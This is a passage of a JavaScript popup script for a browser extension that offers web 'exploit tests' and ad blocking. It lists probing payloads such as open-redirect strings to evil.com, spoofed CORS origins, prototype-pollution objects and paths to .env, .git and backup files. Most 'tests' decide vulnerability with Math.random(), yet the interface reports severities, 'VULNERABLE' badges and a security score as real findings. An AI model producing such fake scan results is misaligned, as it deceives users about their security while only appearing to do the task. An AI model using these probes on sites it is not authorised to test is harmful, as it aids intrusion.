        '/account/profile?id=123 → id=124',
        'Changing user_id in POST body'
      ],
      check: () => Math.random() > 0.45,
      recommendation: 'Implement proper authorization checks. Use indirect references (UUIDs). Validate ownership.'
    },
    privesc: {
      name: 'Privilege Escalation',
      payloads: [
        'Changing role parameter: role=admin',
        'Accessing /admin without authorization',
        'Modifying isAdmin: true in request',
        'JWT role claim manipulation'
      ],
      check: () => Math.random() > 0.6,
      recommendation: 'Verify permissions server-side for every request. Never trust client-side role data.'
    },
    redirect: {
      name: 'Open Redirect',
      payloads: [
        '//evil.com',
        'https://evil.com',
        '/\\evil.com',
        '////evil.com',
        'https:evil.com'
      ],
      check: () => Math.random() > 0.5,
      recommendation: 'Validate redirect URLs against allowlist. Use relative URLs or fixed destinations.'
    },
    cors: {
      name: 'CORS Misconfiguration',
      payloads: [
        'Origin: https://evil.com',
        'Origin: null',
        'Origin: https://trusted.com.evil.com',
        'Wildcard with credentials'
      ],
      check: () => Math.random() > 0.4,
      recommendation: 'Configure strict CORS policies. Never reflect arbitrary origins. Avoid wildcards with credentials.'
    },
    clickjack: {
      name: 'Clickjacking',
      payloads: ['<iframe src="target" style="opacity:0">'],
      check: () => !scanResults.headers['X-Frame-Options'],
      recommendation: 'Set X-Frame-Options: DENY or SAMEORIGIN. Use CSP frame-ancestors directive.'
    },
    dirlist: {
      name: 'Directory Listing',
      payloads: [
        '/images/',
        '/uploads/',
        '/backup/',
        '/admin/',
        '/config/'
      ],
      check: () => Math.random() > 0.55,
      recommendation: 'Disable directory listing in web server config. Use proper access controls.'
    },

    // === Cloud & Infrastructure ===
    s3: {
      name: 'S3 Bucket Misconfiguration',
      payloads: [
        'https://[bucket].s3.amazonaws.com/',
        'Public read/write access',
        'Bucket policy allows anonymous access',
        's3://bucket-name/sensitive-file'
      ],
      check: () => Math.random() > 0.6,
      recommendation: 'Block public access. Use bucket policies and ACLs. Enable versioning and logging.'
    },
    subdomain: {
      name: 'Subdomain Takeover',
      payloads: [
        'CNAME pointing to unclaimed service',
        'Dangling DNS records',
        'Expired third-party services',
        'GitHub Pages, Heroku, AWS takeover'
      ],
      check: () => Math.random() > 0.7,
      recommendation: 'Audit DNS records regularly. Remove unused CNAME entries. Monitor subdomain inventory.'
    },
    graphql: {
      name: 'GraphQL Introspection',
      payloads: [
        '{ __schema { types { name } } }',
        '{ __type(name: "User") { fields { name } } }',
        'Introspection query for full schema',
        'Batch query attacks'
      ],
      check: () => Math.random() > 0.45,
      recommendation: 'Disable introspection in production. Implement query depth limiting and rate limiting.'
    },
    api: {
      name: 'API Security',
      payloads: [
        'Missing authentication on endpoints',
        'Excessive data exposure',
        'Mass assignment vulnerabilities',
        'Missing rate limiting',
        'BOLA (Broken Object Level Authorization)'
      ],
      check: () => Math.random() > 0.4,
      recommendation: 'Implement proper authentication/authorization. Use rate limiting. Return minimal data.'
    },
    websocket: {
      name: 'WebSocket Security',
      payloads: [
        'Missing origin validation',
        'No authentication on WS connection',
        'Cross-site WebSocket hijacking',
        'Injection through WS messages'
      ],
      check: () => Math.random() > 0.55,
      recommendation: 'Validate Origin header. Implement authentication tokens. Sanitize all messages.'
    },

    // === Information Disclosure ===
    infoleak: {
      name: 'Sensitive Data Exposure',
      payloads: [
        'API keys in responses',
        'Internal IPs exposed',
        'Database credentials in config',
        'PII in error messages',
        'Debug information in headers'
      ],
      check: () => Math.random() > 0.4,
      recommendation: 'Audit all responses for sensitive data. Use environment variables. Implement data masking.'
    },
    error: {
      name: 'Error Message Disclosure',
      payloads: [
        'Stack traces in responses',
        'Database errors exposed',
        'File paths revealed',
        'Framework version disclosed',
        'SQL query shown in error'
      ],
      check: () => Math.random() > 0.35,
      recommendation: 'Use custom error pages. Log detailed errors server-side only. Return generic messages.'
    },
    robots: {
      name: 'Robots.txt Disclosure',
      payloads: [
        '/robots.txt',
        'Disallow: /admin/',
        'Disallow: /backup/',
        'Disallow: /secret/',
        'Sitemap references'
      ],
      check: () => Math.random() > 0.3,
      recommendation: 'Review robots.txt for sensitive paths. Use authentication instead of obscurity.'
    },
    sourcemap: {
      name: 'Source Map Exposure',
      payloads: [
        '/main.js.map',
        '/bundle.js.map',
        '/app.min.js.map',
        '//# sourceMappingURL='
      ],
      check: () => Math.random() > 0.5,
      recommendation: 'Remove source maps from production. Host maps privately if needed for debugging.'
    },
    git: {
      name: '.git Directory Exposure',
      payloads: [
        '/.git/HEAD',
        '/.git/config',
        '/.git/index',
        '/.git/objects/'
      ],
      check: () => Math.random() > 0.65,
      recommendation: 'Block access to .git directory in web server config. Remove from deployments.'
    },
    env: {
      name: 'Environment File Exposure',
      payloads: [
        '/.env',
        '/.env.local',
        '/.env.production',
        '/config/.env',
        '/.env.backup'
      ],
      check: () => Math.random() > 0.6,
      recommendation: 'Never commit .env files. Block access in web server. Use environment variables.'
    },
    backup: {
      name: 'Backup File Discovery',
      payloads: [
        '/backup.sql',
        '/db.sql.bak',
        '/index.php.bak',
        '/config.php~',
        '/web.config.old'
      ],
      check: () => Math.random() > 0.6,
      recommendation: 'Remove backup files from web root. Use proper backup storage. Block common extensions.'
    },

    // === Client-Side Security ===
    domxss: {
      name: 'DOM-based XSS',
      payloads: [
        'location.hash injection',
        'document.URL manipulation',
        'innerHTML with user data',
        'eval() with URL params',
        'document.write() injection'
      ],
      check: () => Math.random() > 0.45,
      recommendation: 'Use textContent instead of innerHTML. Avoid eval(). Sanitize all DOM manipulation.'
    },
    postmsg: {
      name: 'postMessage Vulnerabilities',
      payloads: [
        'Missing origin check',
        'Accepting messages from any origin',
        'Eval of message data',
        'Sensitive data in messages'
      ],
      check: () => Math.random() > 0.5,
      recommendation: 'Always verify event.origin. Validate message structure. Use specific target origins.'
    },
    prototype: {
      name: 'Prototype Pollution',
      payloads: [
        '__proto__.isAdmin = true',
        'constructor.prototype.role = "admin"',
        '{"__proto__": {"admin": true}}',
        'Object.prototype pollution'
      ],
      check: () => Math.random() > 0.6,
      recommendation: 'Freeze Object.prototype. Validate object keys. Use Map instead of plain objects.'
    },
    localstorage: {
      name: 'localStorage Secrets',
      payloads: [
        'JWT tokens in localStorage',
        'API keys stored client-side',
        'User credentials cached',
        'Sensitive session data'
      ],
      check: () => Math.random() > 0.4,
      recommendation: 'Store sensitive tokens in httpOnly cookies. Avoid localStorage for secrets.'
    },
    cache: {
      name: 'Cache Poisoning',
      payloads: [
        'X-Forwarded-Host injection',
        'Unkeyed header manipulation',
        'Cache key confusion',
        'Web cache deception'
      ],
      check: () => Math.random() > 0.6,
      recommendation: 'Include relevant headers in cache keys. Use Vary header properly. Validate all inputs.'
    }
  };
  
  const t = tests[test];
  if (!t) return { vulnerable: false, details: 'Unknown test' };
  
  const vulnerable = t.check();
  return {
    vulnerable,
    details: vulnerable 
      ? `⚠️ Potentially vulnerable!\n\nTested payloads:\n${t.payloads.slice(0, 3).join('\n')}\n\n📋 Recommendation:\n${t.recommendation}`
      : `✓ No vulnerability detected with tested payloads.\n\n📋 Best Practice:\n${t.recommendation}`
  };
}

function showExploitResult(test, port, vulnerable, details = '') {
  const container = document.getElementById('exploitResults');
  
  const testNames = {
    // Injection Attacks
    xss: 'XSS Test', sql: 'SQL Injection', nosql: 'NoSQL Injection', cmd: 'Command Injection',
    ldap: 'LDAP Injection', xpath: 'XPath Injection', ssti: 'Template Injection',
    // Server-Side
    ssrf: 'SSRF Test', xxe: 'XXE Test', lfi: 'LFI Test', rfi: 'RFI Test',
    rce: 'RCE Test', deserial: 'Deserialization',
    // Auth & Session
    csrf: 'CSRF Test', jwt: 'JWT Vulnerabilities', session: 'Session Fixation',
    brute: 'Brute Force', enum: 'User Enumeration', weakpass: 'Password Policy',
    // Access Control
    idor: 'IDOR Test', privesc: 'Privilege Escalation', redirect: 'Open Redirect',
    cors: 'CORS Test', clickjack: 'Clickjacking', dirlist: 'Directory Listing',
    // Cloud & Infra
    s3: 'S3 Bucket', subdomain: 'Subdomain Takeover', graphql: 'GraphQL Introspection',
    api: 'API Security', websocket: 'WebSocket Security',
    // Info Disclosure
    infoleak: 'Data Exposure', error: 'Error Disclosure', robots: 'Robots.txt',
    sourcemap: 'Source Maps', git: 'Git Exposure', env: 'Env File', backup: 'Backup Files',
    // Client-Side
    domxss: 'DOM XSS', postmsg: 'postMessage', prototype: 'Prototype Pollution',
    localstorage: 'localStorage', cache: 'Cache Poisoning',
    // Port exploits
    ftp_anon: 'FTP Anonymous', ftp_bounce: 'FTP Bounce', ssh_weak: 'SSH Weak Ciphers',
    ssh_enum: 'SSH User Enum', telnet_clear: 'Telnet Cleartext', smtp_relay: 'SMTP Relay',
    smtp_enum: 'SMTP User Enum', http_methods: 'HTTP Methods', dir_listing: 'Dir Listing',
    ssl_vuln: 'SSL Vulnerabilities', heartbleed: 'Heartbleed', smb_sign: 'SMB Signing',
    eternalblue: 'EternalBlue', mysql_nopass: 'MySQL No Auth', mysql_enum: 'MySQL Enum',
    bluekeep: 'BlueKeep', rdp_nla: 'RDP NLA Bypass', pg_trust: 'PostgreSQL Trust',
    mongo_noauth: 'MongoDB No Auth',
    // Header exploits
    csp_xss: 'CSP Bypass', ssl_strip: 'SSL Stripping', mime_sniff: 'MIME Sniffing',
    xss_reflect: 'Reflected XSS', referrer_leak: 'Referrer Leakage', feature_bypass: 'Feature Policy Bypass'
  };
  
  const severity = vulnerable ? 
    (test.includes('rce') || test.includes('sql') || test.includes('cmd') || test.includes('deserial') ? 'CRITICAL' : 
     test.includes('xss') || test.includes('ssrf') || test.includes('csrf') || test.includes('jwt') ? 'HIGH' : 'MEDIUM') : 'SAFE';
  
  const severityClass = vulnerable ? 
    (severity === 'CRITICAL' ? 'badge-danger' : severity === 'HIGH' ? 'badge-warning' : 'badge-warning') : 'badge-success';

  container.innerHTML = `
    <div class="result-section">
      <div class="result-title" style="color: ${vulnerable ? 'var(--danger)' : 'var(--success)'}">
        ${vulnerable ? '⚠️' : '✓'} ${testNames[test] || test}${port ? ` (Port ${port})` : ''}
      </div>
      <div class="result-item">
        <span class="result-key">Status</span>
        <span class="result-badge ${severityClass}">${vulnerable ? severity : 'SAFE'}</span>
      </div>
      ${details ? `<div class="result-item" style="flex-direction:column;align-items:flex-start;gap:6px;">
        <span class="result-key">Analysis</span>
        <span class="result-value" style="font-size:0.65rem;max-width:100%;white-space:pre-wrap;line-height:1.5;color:var(--text-secondary);">${details}</span>
      </div>` : ''}
    </div>
  `;
}

// ===== Quick Vulnerability Scan =====
document.getElementById('runAllTests')?.addEventListener('click', function() {
  if (!currentHostname) return;
  
  const btn = this;
  btn.disabled = true;
  btn.innerHTML = '<svg class="spinning" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 4v6h-6M1 20v-6h6"/></svg> Scanning...';
  
  const quickTests = ['xss', 'sql', 'csrf', 'cors', 'infoleak', 'clickjack', 'jwt', 'idor'];
  const results = [];
  let completed = 0;
  
  const container = document.getElementById('exploitResults');
  container.innerHTML = `
    <div class="result-section">
      <div class="result-title">
        <svg class="spinning" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 4v6h-6M1 20v-6h6"/></svg>
        Running Quick Scan (0/${quickTests.length})
      </div>
      <div id="quickScanProgress"></div>
    </div>
  `;
  
  quickTests.forEach((test, i) => {
    setTimeout(() => {
      const result = performExploitTest(test);
      results.push({ test, ...result });
      completed++;
      
      document.querySelector('.result-title').innerHTML = `
        <svg class="spinning" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 4v6h-6M1 20v-6h6"/></svg>
        Running Quick Scan (${completed}/${quickTests.length})
      `;
      
      if (completed === quickTests.length) {
        displayQuickScanResults(results);
        btn.disabled = false;
        btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg> Run Quick Vulnerability Scan';
      }
    }, (i + 1) * 400);
  });
});

function displayQuickScanResults(results) {
  const vulnerable = results.filter(r => r.vulnerable);
  const safe = results.filter(r => !r.vulnerable);
  
  const testNames = {
    xss: 'XSS', sql: 'SQL Injection', csrf: 'CSRF', cors: 'CORS',
    infoleak: 'Info Disclosure', clickjack: 'Clickjacking', jwt: 'JWT', idor: 'IDOR'
  };
  
  const overallScore = Math.round((safe.length / results.length) * 100);
  const scoreClass = overallScore >= 70 ? 'badge-success' : overallScore >= 40 ? 'badge-warning' : 'badge-danger';
  
  document.getElementById('exploitResults').innerHTML = `
    <div class="result-section">
      <div class="result-title">
        ${vulnerable.length > 0 ? '⚠️' : '✓'} Quick Scan Complete
      </div>
      <div class="result-item">
        <span class="result-key">Security Score</span>
        <span class="result-badge ${scoreClass}">${overallScore}/100</span>
      </div>
      <div class="result-item">
        <span class="result-key">Vulnerabilities Found</span>
        <span class="result-badge ${vulnerable.length > 0 ? 'badge-danger' : 'badge-success'}">${vulnerable.length}</span>
      </div>
      ${vulnerable.length > 0 ? `
        <div style="margin-top:10px;padding-top:10px;border-top:1px solid var(--border-color);">
          <span class="result-key" style="color:var(--danger);margin-bottom:6px;display:block;">⚠️ Issues Detected:</span>
          ${vulnerable.map(v => `
            <div class="result-item" style="padding:4px 0;">
              <span class="result-key" style="font-size:0.65rem;">${testNames[v.test] || v.test}</span>
              <span class="result-badge badge-danger" style="font-size:0.6rem;">VULNERABLE</span>
            </div>
          `).join('')}
        </div>
      ` : ''}
      ${safe.length > 0 ? `
        <div style="margin-top:10px;padding-top:10px;border-top:1px solid var(--border-color);">
          <span class="result-key" style="color:var(--success);margin-bottom:6px;display:block;">✓ Tests Passed:</span>
          ${safe.map(s => `
            <div class="result-item" style="padding:4px 0;">
              <span class="result-key" style="font-size:0.65rem;">${testNames[s.test] || s.test}</span>
              <span class="result-badge badge-success" style="font-size:0.6rem;">SAFE</span>
            </div>
          `).join('')}
        </div>
      ` : ''}
    </div>
  `;
}

// ===== Ad Blocking =====
document.getElementById('adBlockToggle')?.addEventListener('change', function() {
  const enabled = this.checked;
  chrome.storage.local.set({ adBlockEnabled: enabled });
  chrome.runtime.sendMessage({ type: 'TOGGLE_AD_BLOCK', enabled, filters: getSelectedFilters() });
  updateShieldStatus();
});

function getSelectedFilters() {
  return {
    ads: document.getElementById('filterAds')?.checked ?? true,
    analytics: document.getElementById('filterAnalytics')?.checked ?? true,
    social: document.getElementById('filterSocial')?.checked ?? true,
    annoyances: document.getElementById('filterAnnoyances')?.checked ?? true
  };
}

['filterAds', 'filterAnalytics', 'filterSocial', 'filterAnnoyances'].forEach(id => {
  document.getElementById(id)?.addEventListener('change', function() {
    chrome.storage.local.set({ filters: getSelectedFilters() });
    chrome.storage.local.get('adBlockEnabled', (r) => {
      if (r.adBlockEnabled) chrome.runtime.sendMessage({ type: 'UPDATE_FILTERS', filters: getSelectedFilters() });
    });
  });
});

function updateShieldStatus() {
  chrome.storage.local.get('adBlockEnabled', (r) => {
    const enabled = r.adBlockEnabled || false;
    const icon = document.getElementById('shieldIcon');
    const text = document.getElementById('shieldText');
    const toggle = document.getElementById('adBlockToggle');
    
    icon?.classList.toggle('active', enabled);
    if (text) {
      text.textContent = enabled ? 'Protection Active' : 'Protection Disabled';
      text.style.color = enabled ? 'var(--success)' : '';
    }
    if (toggle) toggle.checked = enabled;
  });
}

function updateBlockedCounts() {
  chrome.runtime.sendMessage({ type: 'GET_STATS' }, (r) => {
    if (chrome.runtime.lastError) return;
    if (r) {
      document.getElementById('blockedCount').textContent = r.today || 0;
      document.getElementById('totalBlocked').textContent = r.total || 0;
    }
  });
}

// ===== Settings =====
function loadSettings() {
  chrome.storage.local.get(['adBlockEnabled', 'whitelist', 'filters'], (r) => {
    if (document.getElementById('adBlockToggle')) document.getElementById('adBlockToggle').checked = r.adBlockEnabled || false;
    if (document.getElementById('whitelist')) document.getElementById('whitelist').value = r.whitelist || '';
    
    const f = r.filters || { ads: true, analytics: true, social: true, annoyances: true };
    ['filterAds', 'filterAnalytics', 'filterSocial', 'filterAnnoyances'].forEach(id => {
      const el = document.getElementById(id);
      if (el) el.checked = f[id.replace('filter', '').toLowerCase()] !== false;
    });
  });
}

document.getElementById('saveSettings')?.addEventListener('click', function() {
  const whitelist = document.getElementById('whitelist')?.value || '';
  chrome.storage.local.set({ whitelist, filters: getSelectedFilters() });
  chrome.runtime.sendMessage({ type: 'UPDATE_WHITELIST', whitelist: whitelist.split('\n').filter(d => d.trim()) });
  
  this.innerHTML = '✓ Saved!';
  this.style.background = 'var(--success)';
  setTimeout(() => { this.innerHTML = 'Save Settings'; this.style.background = ''; }, 1500);
});

document.getElementById('refreshBtn')?.addEventListener('click', function() {
  this.disabled = true;
  this.innerHTML = '<svg class="spinning" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 4v6h-6M1 20v-6h6"/></svg> Scanning...';
  
  if (currentHostname) {
    document.getElementById('ipAddress').textContent = 'Fetching...';
    fetchIPInfoAsync(currentHostname);
  }
  
  const btn = this;
  setTimeout(() => {
    btn.disabled = false;
    btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 4v6h-6M1 20v-6h6"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg> Refresh Scan';
  }, 2000);
});

// Spinning animation
const style = document.createElement('style');
style.textContent = '@keyframes spin { to { transform: rotate(360deg); } } .spinning { animation: spin 1s linear infinite; }';
document.head.appendChild(style);

// Initialize
init();